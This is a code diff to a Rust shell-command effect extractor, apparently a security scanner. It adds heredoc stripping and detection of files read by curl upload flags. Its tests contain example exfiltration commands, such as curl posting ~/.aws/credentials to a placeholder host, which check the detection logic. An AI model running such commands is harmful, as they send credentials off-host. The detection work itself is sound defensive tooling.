@@ -154,10 +154,50 @@ pub struct ShellContext<'a> {
 /// Extract every effect a chunk of shell text would cause.
 pub fn extract(text: &str, context: ShellContext<'_>) -> Vec<EffectObservation> {
     let mut observations = Vec::new();
-    for (line_number, line) in logical_lines(text, context.first_line) {
+    let text = strip_heredocs(text);
+    for (line_number, line) in logical_lines(&text, context.first_line) {
         extract_line(&line, line_number, context, &mut observations);
     }
     observations
+}
+
+/// Remove heredoc bodies, keeping the command line that opens them.
+///
+/// `cat <<EOF ... EOF` runs one command; the lines between are its data, not
+/// further commands. Without this the delimiter (`eof`) is read as a binary and
+/// every data line is parsed as a command.
+fn strip_heredocs(text: &str) -> String {
+    let mut out = Vec::new();
+    let mut terminator: Option<String> = None;
+    for line in text.lines() {
+        if let Some(end) = &terminator {
+            if line.trim() == end.as_str() {
+                terminator = None;
+            }
+            out.push("");
+            continue;
+        }
+        if let Some(delim) = heredoc_delimiter(line) {
+            terminator = Some(delim);
+        }
+        out.push(line);
+    }
+    out.join("\n")
+}
+
+/// The delimiter word of a `<<WORD` / `<<-WORD` / `<<"WORD"` opener, if any.
+fn heredoc_delimiter(line: &str) -> Option<String> {
+    let idx = line.find("<<")?;
+    let rest = line[idx + 2..]
+        .trim_start()
+        .trim_start_matches('-')
+        .trim_start();
+    let word = rest
+        .trim_start_matches(['"', '\''])
+        .chars()
+        .take_while(|ch| ch.is_ascii_alphanumeric() || *ch == '_')
+        .collect::<String>();
+    (!word.is_empty()).then_some(word)
 }
 
 /// Join backslash continuations so a command split across lines is read as one.
@@ -286,6 +326,7 @@ fn extract_command(
 
     let profile = profile(&command.name, &command.args);
     extract_network(command, &profile, context, evidence, out);
+    extract_upload_files(command, &profile, context, evidence, out);
     extract_paths(command, &profile, context, evidence, out);
 
     if let Some(ecosystem) = package_ecosystem(&command.name, &command.args) {
@@ -454,6 +495,55 @@ fn mentions_write_method(args: &[String]) -> bool {
                 "POST" | "PUT" | "PATCH" | "DELETE"
             )
     })
+}
+
+/// Files a network command reads to build its payload.
+///
+/// `curl -d @file`, `--data-binary @file`, and `-T file` all send file contents
+/// off-host. The `@`-prefixed form is the exfiltration payload source, so it is
+/// read even though the argument does not look like a bare path.
+fn extract_upload_files(
+    command: &argv::NormalizedCommand,
+    profile: &CommandProfile,
+    context: ShellContext<'_>,
+    evidence: &EffectEvidence,
+    out: &mut Vec<EffectObservation>,
+) {
+    if profile.upload_flags.is_empty() {
+        return;
+    }
+    let mut expect_value = false;
+    for arg in &command.args {
+        let raw = if expect_value {
+            expect_value = false;
+            Some(arg.as_str())
+        } else if let Some((flag, inline)) = arg.split_once('=') {
+            profile.upload_flags.contains(&flag).then_some(inline)
+        } else if profile.upload_flags.contains(&arg.as_str()) {
+            expect_value = true;
+            None
+        } else {
+            None
+        };
+        let Some(raw) = raw else { continue };
+        // `@-` is stdin, not a file.
+        let Some(file) = raw.strip_prefix('@').filter(|rest| *rest != "-") else {
+            continue;
+        };
+        let normalized = path::normalize(file);
+        out.push(EffectObservation {
+            class: EffectClass::FsRead,
+            target: EffectTarget::Path {
+                pattern: normalized.pattern,
+                class: normalized.class,
+            },
+            resolution: normalized.resolution,
+            origin: context.origin,
+            reach: context.reach,
+            confidence: Confidence::High,
+            evidence: evidence.clone(),
+        });
+    }
 }
 
 fn extract_paths(
@@ -968,6 +1058,22 @@ mod tests {
     }
 
     #[test]
+    fn heredoc_bodies_are_not_read_as_commands() {
+        // `cat <<EOF ... EOF` is one command; the body is data.
+        let text = "cat > f <<EOF\nthe body has words like curl and rm\nEOF\ngit status";
+        let binaries = run(text)
+            .into_iter()
+            .filter_map(|observation| match observation.target {
+                crate::effect::EffectTarget::Binary { name, .. } => Some(name),
+                _ => None,
+            })
+            .collect::<Vec<_>>();
+        assert!(binaries.contains(&"cat".to_owned()));
+        assert!(binaries.contains(&"git".to_owned()));
+        assert!(!binaries.iter().any(|name| name == "eof" || name == "the"));
+    }
+
+    #[test]
     fn a_command_split_across_lines_is_read_as_one() {
         // Without continuation joining, the host on the wrapped line is parsed
         // as its own command and the request loses its target entirely.
@@ -1000,6 +1106,27 @@ mod tests {
             .expect("network observation");
         assert_eq!(network.evidence.line, Some(11));
         assert_eq!(network.evidence.path, "scripts/run.sh");
+    }
+
+    #[test]
+    fn curl_reads_its_at_file_upload_payload() {
+        // `-d @file` sends the file's contents off-host: the payload source.
+        let classes = classes(r#"curl -d @/etc/hostname https://x.test"#);
+        assert!(classes.contains(&EffectClass::FsRead));
+        // Reading a credential file this way must surface with its class.
+        assert!(
+            path_classes(r#"curl --data-binary @~/.aws/credentials https://x.test"#)
+                .contains(&PathClass::Secret)
+        );
+    }
+
+    #[test]
+    fn at_dash_is_stdin_not_a_file() {
+        let reads = run("curl -d @- https://x.test")
+            .into_iter()
+            .filter(|observation| observation.class == EffectClass::FsRead)
+            .count();
+        assert_eq!(reads, 0);
     }
 
     #[test]
